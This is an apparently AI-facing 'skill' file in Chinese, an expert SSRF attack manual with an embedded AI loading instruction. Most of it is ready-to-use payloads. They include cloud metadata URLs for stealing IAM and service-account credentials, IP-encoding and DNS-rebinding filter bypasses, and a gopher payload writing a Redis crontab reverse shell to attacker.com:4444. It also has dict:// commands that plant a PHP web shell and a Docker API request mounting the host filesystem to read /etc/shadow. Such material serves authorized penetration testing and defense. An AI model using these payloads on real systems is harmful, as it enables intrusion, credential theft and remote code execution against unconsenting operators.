# 技能：服务器端请求伪造（SSRF）—— 专家级攻击手册

> **AI 加载指令**：专家级 SSRF 技术。涵盖 URL 过滤绕过、云元数据端点、协议利用、盲 SSRF 检测以及串联至 RCE。基础模型知道基本的 169.254.169.254 —— 本文件涵盖它们遗漏的内容。对于现实世界的 CVE 链、DNS 重绑定的深入分析、K8s SSRF 以及 SSRF → Redis → RCE 的完整利用，请加载配套的 [SCENARIOS.md](./SCENARIOS.md)。

## 0. 快速入门

### 扩展场景

当你需要时，也加载 [SCENARIOS.md](./SCENARIOS.md)：
- WebLogic SSRF (CVE-2014-4210) — `uddiexplorer/SearchPublicRegistries.jsp` + `operator` 参数 + `%0D%0A` CRLF 注入 Redis 命令
- SSRF → 内部 Redis → 写 crontab 反向 Shell 完整有效载荷链
- DNS 重绑定深入分析 — TTL=0 技巧，初始合法→第二内部解析，`rbndr.us` 服务
- Kubernetes SSRF (CVE-2020-8555) 和绕过 (CVE-2020-8562) 通过 DNS 重绑定
- 通过 PDF/截图生成器进行 SSRF — HTML-to-PDF 中的 `<iframe>` 和 `<img>`
- Gopher 协议完整 TCP 注入 — 通过 Gopherus 的 Redis、MySQL、FastCGI 有效载荷
- URL 解析器混淆用于过滤绕过 — `#@`，`\@`，`%00@`，IPv6 映射 IPv4

### 高级参考

当你需要时，也加载 [URL_PARSER_TRICKS.md](./URL_PARSER_TRICKS.md)：
- URL 解析器差异表：Python urllib vs requests vs Java URL vs PHP parse_url vs Node url.parse vs Go net/url
- 完整云元数据端点目录 (AWS IMDSv1/v2, GCP, Azure, DigitalOcean, 阿里云, Oracle Cloud, Kubernetes, Hetzner, OpenStack)
- gopher:// 有效载荷配方用于 Redis、MySQL、SMTP、FastCGI、Memcached（含编码规则）
- DNS 重绑定详细攻击流程，含 TTL 操作和 TOCTOU 分析
- PDF/wkhtmltopdf/WeasyPrint/Chrome 无头/PhantomJS SSRF 模式和提取技术

如果你刚发现一个获取 URL 的参数，直接在此处进行初步确认。

### 初步有效载荷

```text
http://127.0.0.1/
http://localhost/
http://169.254.169.254/latest/meta-data/
http://[::1]/
http://127.1/
```

### 主机验证绕过系列

| 验证类型 | 尝试 |
|---|---|
| 阻止 `localhost` 字符串 | `127.0.0.1`，`127.1`，`[::1]` |
| 仅阻止直接 IP | 内部 DNS 名称，十进制/八进制/十六进制 IP 形式 |
| 前缀白名单 | 用户名部分，子域名混淆，重定向链 |
| 跟随重定向 | 无害外部 URL 重定向至内部目标 |
| 一次解析，两次获取 | 混合编码或 DNS 重绑定风格目标 |

### 协议路由

| 目标 | 协议 / 目标 |
|---|---|
| 云凭证 | 元数据 HTTP 端点 |
| 内部 HTTP 管理员 | `http://127.0.0.1:port/` |
| Redis / 原始 TCP 风格滥用 | `gopher://` |
| 本地文件读取候选 | `file://` |
| 字典 / 横幅测试 | `dict://` |

---

## 1. 查找 SSRF 表面

查找包含 DNS 名称、IP 地址或 URL 的任何参数：

```
loc=           url=        path=         endpoint=
imageUrl=      dest=       redirect=     uri=
callback=      load=       file=         resource=
link=          src=        data=         ref=
```

**不太明显的 SSRF 向量**：
- PDF/截图生成（捕获 URL）
- Webhook 配置字段
- 通过 URL 导入/导出（CSV 导入，RSS/Atom 源）
- OAuth 重定向 URI（有时会触发服务器端获取）
- `X-Forwarded-Host` / `X-Real-IP` 代理链中的头
- XML `DOCTYPE` 带外部实体 (`file://`，`http://`)
- GraphQL `@link` 指令（联盟）
- 内容类型：`text/html` 页面解析 `<link>` 预加载头

---

## 2. 基本确认方法

```
步骤 1：提供你的 Burp Collaborator / interact.sh URL
        → 检查服务器发起出站连接（完整 SSRF 确认）

步骤 2：如果没有回调 → 测试时间型（开放端口=快，关闭=慢/重置）：
        比较响应时间：
        http://192.168.1.1:22   （可能开放→快）
        http://192.168.1.1:9999 (可能关闭→慢/超时)

步骤 3：尝试访问本地主机服务：
        http://127.0.0.1:8080
        http://127.0.0.1:22
        http://127.0.0.1:6379  (Redis)
        http://127.0.0.1:9200  (Elasticsearch)
        http://127.0.0.1:5984  (CouchDB)
        http://127.0.0.1:2375  (Docker 守护进程 — 关键！)
        http://127.0.0.1:4840  (内部管理员)
```

---

## 3. 云元数据端点 — 必试

### AWS EC2 IMDSv1（无需认证 — 关键）
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
```

### AWS IMDSv2（需要令牌 — 但检查 SSRF 是否能 GET 令牌）
```
步骤 1：PUT http://169.254.169.254/latest/api/token
        头部：X-aws-ec2-metadata-token-ttl-seconds: 21600
步骤 2：GET http://169.254.169.254/latest/meta-data/
        头部：X-aws-ec2-metadata-token: TOKEN
```
**如果 SSRF 支持自定义头部 → 完整 IMDSv2 绕过**。

### Google Cloud
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
头部：Metadata-Flavor: Google
```

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
头部：Metadata: true
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/
```

### 阿里云
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

### Kubernetes 服务账户
```
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
http://kubernetes.default.svc/api/v1/namespaces/default/secrets
```

---

## 4. IP 地址过滤绕过技巧

当 `169.254.169.254`、`127.0.0.1`、`localhost` 被阻止时：

### 本地主机变体
```
127.0.0.1
127.1
127.0.1
127.000.000.001    ← 八进制填充
0x7f000001         ← 十六进制
2130706433         ← 十进制 (0x7f000001)
0177.0000.0000.0001  ← 八进制
[::]               ← IPv6 环回
[::1]              ← IPv6 环回
[::ffff:127.0.0.1] ← IPv4 映射 IPv6
```

### 169.254.169.254 变体
```
169.254.169.254
2852039166               ← 十进制
0xa9fea9fe               ← 十六进制
0251.0376.0251.0376      ← 八进制
[::ffff:169.254.169.254] ← IPv6
169.254.169.254.nip.io   ← DNS 重绑定服务
```

### 私有网络范围
```
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
fc00::/7  ← IPv6 私有
```

### 通过 DNS 输入绕过过滤
如果过滤器检查 DNS 解析的 IP（不是主机名）：
```
http://attacker.com/  ← DNS A 记录指向 169.254.169.254
```
使用 DNS 重绑定：初始查询返回有效 IP → 通过过滤器 → 第二次请求返回内部 IP。

---

## 5. URL 方案攻击

当 `http://` 被允许或弱过滤时：

```
file:///etc/passwd
file:///proc/self/environ
file:///proc/net/arp   ← 揭示内部网络 ARP 表
file:///proc/net/tcp   ← 打开网络连接

dict://127.0.0.1:6379/INFO   ← Redis INFO 命令通过 dict://

gopher://127.0.0.1:6379/_INFO%0d%0a   ← Redis via gopher
gopher://127.0.0.1:9200/   ← Elasticsearch

sftp://attacker.com:11111/   ← 触发 SFTP 连接（凭证哈希）
ldap://attacker.com:389/     ← 触发 LDAP 绑定
ftp://attacker.com/          ← 触发 FTP 连接
```

### Redis Gopher SSRF（完整 RCE 潜力）
```
gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0Aping%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2456%0D%0A%0D%0A%0A%0A*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0A%0A%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
```

---

## 6. 盲 SSRF 检测

当响应不反映获取内容时：

1. **Burp Collaborator / interact.sh**：检查服务器发起 DNS + HTTP 请求
2. **Pingback/webhook 滥用**：配置应用程序自己的 webhook 至你的 URL
3. **时间分析**：内部开放端口 vs 关闭端口响应时间差异
4. **错误分析**：不同错误消息（"主机未找到" vs "连接拒绝" vs "超时"）揭示内部网络拓扑

---

## 7. 内部服务利用

### Docker API (2375 无需认证)
```
http://127.0.0.1:2375/v1.24/containers/json      ← 列出容器
http://127.0.0.1:2375/v1.24/images/json          ← 列出镜像
# 创建特权容器 → 逃逸到主机：
POST http://127.0.0.1:2375/v1.24/containers/create
{"Image":"alpine","Cmd":["cat","/etc/shadow"],"HostConfig":{"Binds":["/:/host"]}}
```

### Elasticsearch (9200 默认无认证)
```
http://127.0.0.1:9200/_cat/indices
http://127.0.0.1:9200/.kibana/_search
http://127.0.0.1:9200/INDEX_NAME/_search?q=*
```

### Redis (6379 — 常见无需认证)
```
dict://127.0.0.1:6379/CONFIG:SET:dir:/var/www/html
dict://127.0.0.1:6379/CONFIG:SET:dbfilename:shell.php
dict://127.0.0.1:6379/SET:key('<?php system($_GET[c]);?>')
dict://127.0.0.1:6379/BGSAVE
```

### 内部管理面板
```
http://127.0.0.1:8080/admin
http://127.0.0.1:8443/admin
http://127.0.0.1:9000/actuator   ← Spring Boot actuator（暴露端点）
http://127.0.0.1:9000/actuator/env
http://127.0.0.1:9000/actuator/heapdump
```

---

## 8. SSRF + 过滤绕过决策树

```
发现 SSRF 参数？
├── 直接尝试 http://169.254.169.254/ → 被阻止？
│   ├── 尝试十进制/十六进制/八进制变体
│   ├── 尝试 IPv6 变体 [::ffff:169.254.169.254]
│   ├── 尝试 DNS 重绑定 (nip.io, 自定义 NS)
│   └── 尝试重定向：attacker.com → 169.254.169.254 (302)
│
├── 尝试 http://127.0.0.1/ → 被阻止？
│   ├── 尝试 127.1 / 127.0.1 / 0x7f000001 / 2130706433
│   ├── 尝试本地主机 → 可能不被阻止
│   └── 尝试 IPv6 [::1]
│
├── 允许哪些协议？
│   ├── dict:// → 测试 Redis, Memcached
│   ├── gopher:// → 完整 TCP 数据注入（目标 Redis/SMTP）
│   ├── file:// → 本地文件读取
│   └── sftp:// ldap:// ftp:// → 网络交互
│
└── 盲 SSRF → 使用 Burp Collaborator
    └── 仅 DNS → 使用 DNS 重绑定或 OOB DNS 的 SSRF
```

---

## 9. SSRF-FILTER 思维方式

根据 zseano 的方法论：**如果开发者仅过滤 `169.254.169.254` 直接但不是 `http://169.254.169.254/latest/meta-data`**（完整路径），或忘记考虑：
- IPv6 等价物  
- 解析为内部 IP 的 DNS 名称
- 重定向链（服务器跟随 302 至内部 IP）

**经典差距**：应用过滤 `127.0.0.1` 但不是 `127.1` 或 `[::1]` 或 `localhost`。

**应用层 SSRF 通过 XML**（当应用解析 XML）：
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<request>&xxe;</request>
```
